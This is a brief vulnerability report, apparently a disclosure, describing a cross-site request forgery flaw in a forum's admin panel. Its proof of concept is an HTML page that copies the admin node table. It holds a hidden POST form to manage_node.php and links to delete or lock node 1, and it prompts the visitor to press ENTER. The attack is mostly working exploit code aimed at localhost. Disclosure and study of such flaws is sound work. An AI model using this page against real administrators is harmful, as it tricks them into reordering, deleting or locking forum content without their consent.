# ??? CSRF
Allows for the forum node to be reordered, deleted or locked through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<table class="table table-hover">
    <thead>
      <tr>
        <th style="width:70%">Node</th>
        <th style="width:10%">Order</th>
        <th style="width:20%">Controls</th>
      </tr>
    </thead>
    <tbody>
      <tr>
      <td>
        <strong><a href="#" target="_blank">First Node</a></strong><br>
        <small>The first node on this forum</small><br>
        <small>Sub-Forums: </small>
      </td>
      <td>
        <form action="http://localhost/admin/manage_node.php" method="POST">
          <input type="hidden" name="node_id" value="1">
          <input type="text" class="form-control" name="node_place" value="0">
          <input type="submit" name="change_place" style="display:none;">
        </form>
      </td>
      <td>
        <div class="btn-group">
            <li><a href="http://localhost/admin/edit_node.php/id/1">Edit Node</a></li>
            <li><a href="http://localhost/admin/manage_node.php/delete_node/1">Delete Node</a></li>
            <li><a href="http://localhost/admin/manage_node.php/toggle_lock/1">Toggle Lock</a></li>
        </div>
      </td>
    </tr>
    </tbody>
</table>

<center><h3>Use <font color="red">ENTER</font> to save catagory order</h3></center>
```
